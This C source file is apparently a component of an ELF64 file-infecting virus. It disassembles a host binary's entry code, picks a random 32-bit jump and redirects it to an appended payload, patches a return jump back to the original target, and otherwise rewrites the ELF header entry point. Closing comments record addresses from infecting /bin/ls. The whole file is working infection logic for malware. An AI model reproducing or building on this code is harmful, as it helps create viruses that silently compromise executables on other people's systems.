#include "virus.h"
#include "disasm.h"
#include "disasm_utils.h"
#include "utils.h"
#include "compiler_utils.h"
#include "errors.h"

#define MAX_JUMP_LOCATIONS	5

/* -------------------------- change header entry --------------------------- */

static bool	change_header_entry(struct safe_ptr clone_ref,
			Elf64_Xword dist_payload_entry)
{
	Elf64_Ehdr	*hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));

	if (!hdr) return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	Elf64_Addr	e_entry = hdr->e_entry;

	e_entry += dist_payload_entry;
	hdr->e_entry = e_entry;

	return true;
}

/* ---------------------- adapt client and loader code ---------------------- */

static void	*get_client_jump_destination(void *client_jump_ptr)
{
	int32_t	*client_jump_value = (int32_t*)(client_jump_ptr + 1);

	return ((client_jump_ptr + JUMP32_INST_SIZE) + *client_jump_value);
}

static void	write_jump_to_client(void *loader_jump_ptr, void *client_jump_destination)
{
	int32_t	value = (int32_t)(client_jump_destination - (loader_jump_ptr + JUMP32_INST_SIZE));

	write_jump(loader_jump_ptr, value, DWORD);
}

static void	write_jump_to_virus(void *client_jump_ptr, void *loader_code_ptr)
{
	int32_t	value = (int32_t)(loader_code_ptr - client_jump_ptr) - JUMP32_INST_SIZE;

	write_jump(client_jump_ptr, value, DWORD);
}

/* -------------------------------------------------------------------------- */

static inline bool	is_jump32(uint8_t *code)
{
	return (*code == 0xe9);
}

static void	*step_instruction(void *client_code_ptr, size_t instruction_length)
{
	void		*rip = NULL;
	uint8_t		*p = (uint8_t*)client_code_ptr;
	uint8_t		prefix = 0;
	uint8_t		opcode;
	int32_t		jmp_value = 0;

next_opcode:
	opcode = *p++;

	// check if has prefix
	if (opcode == 0x0f) {prefix |= OP_PREFIX_0F; goto next_opcode;}
	// check if has REX
	if (opcode >= 0x40 && opcode <= 0x4f) {goto next_opcode;}

	// rel8
	if ((opcode >= 0x70 && opcode <= 0x7f)           // JMPcc
	|| (opcode >= 0xe0 && opcode <= 0xe3)            // LOOP/LOOPcc/JMPcc
	|| (opcode == 0xeb))                             // JMP
	{
		jmp_value = *((int8_t*)p);
		rip = (client_code_ptr + instruction_length) + jmp_value;
	}
	// ff 25 7a bb 21 00 rip jmp
	// rel16/32
	else if ((opcode == 0xe8)                          // CALL
	|| (opcode == 0xe9)                                // JMP
	|| (prefix && (opcode >= 0x80 && opcode <= 0x8f))) // JMPcc
	{
		jmp_value = *((int32_t*)p);
		rip = (client_code_ptr + instruction_length) + jmp_value;
	}
	else if (opcode == 0xff)
	{
		opcode = *p++;

		uint8_t	mod = (opcode & 0b11000000) >> 6;
		uint8_t	reg = (opcode & 0b00111000) >> 3;
		uint8_t	rm  = (opcode & 0b00000111);

		if (mod == 0b00 && reg == 0b100 && rm == 0b101)
		{
			jmp_value = *((int32_t*)p);
			rip = (client_code_ptr + instruction_length) + jmp_value;
		}
	}
	else
	{
		rip = client_code_ptr + instruction_length;
	}
	return rip;
}

static size_t	fill_jump_array(size_t **array, void *client_code_ptr, void *loader_code_ptr)
{
	size_t		njump = 0;

	while (true)
	{
		if (!known_instruction(client_code_ptr, 16))
		{
			break ;
		}
		size_t	instruction_length = disasm_length(client_code_ptr, 16);

		if (instruction_length == 0)
			return 0;

		if (is_jump32(client_code_ptr))
		{
			array[njump++] = client_code_ptr;

			if (njump == MAX_JUMP_LOCATIONS)
				break ;
			putchar('-'); putchar('>'); putchar(' ');
		}
		putchar('0'); putchar('x'); putu64(client_code_ptr); putchar('\n');
		client_code_ptr = step_instruction(client_code_ptr, instruction_length);
	}
	return njump;
}

static bool	change_client_jump(struct safe_ptr clone_ref,
			size_t entry_offset, size_t payload_offset,
			size_t dist_payload_entry,
			size_t dist_client_loader,
			size_t *seed)
{
	// get pointers
	size_t	loader_jump_offset = payload_offset + dist_client_loader;

	void	*loader_jump_ptr = safe(clone_ref, loader_jump_offset, JUMP32_INST_SIZE);
	void	*loader_code_ptr = safe(clone_ref, payload_offset, 0);
	void	*client_code_ptr = safe(clone_ref, entry_offset, dist_payload_entry);

	if (!client_code_ptr || !loader_jump_ptr || !loader_code_ptr)
		return false;

	// fill jumps array
	size_t	*client_jump_ptrs[MAX_JUMP_LOCATIONS] = {NULL};
	size_t	njump = fill_jump_array(client_jump_ptrs, client_code_ptr, loader_code_ptr);

	if (njump == 0)
		return false;

	// select a jump
	size_t	index = random_inrange(seed, 0, njump - 1);
	void	*client_jump_ptr = client_jump_ptrs[index];

	if (client_jump_ptr == 0)
		return false;

	// modify jumps
	void	*client_jump_dst = get_client_jump_destination(client_jump_ptr);

	write_jump_to_client(loader_jump_ptr, client_jump_dst);
	write_jump_to_virus(client_jump_ptr, loader_code_ptr);

	return true;
}

bool	change_entry(struct safe_ptr clone_ref, const struct entry *file_entry,
		size_t dist_client_loader, size_t *seed)
{
	Elf64_Xword	sh_offset          = file_entry->safe_shdr->sh_offset;
	size_t		offset_in_section  = file_entry->offset_in_section;
	size_t		entry_offset       = sh_offset + offset_in_section;
	size_t		payload_offset     = file_entry->end_of_last_section;
	Elf64_Xword	dist_payload_entry = payload_offset - entry_offset;

	if (!change_client_jump(clone_ref, entry_offset, payload_offset, dist_payload_entry, dist_client_loader, seed))
		change_header_entry(clone_ref, dist_payload_entry);

	return true;
}

// /bin/ls loader vaddr -> 0x41da64
// infect -> 0x40264b
// return <- 0x4022e0
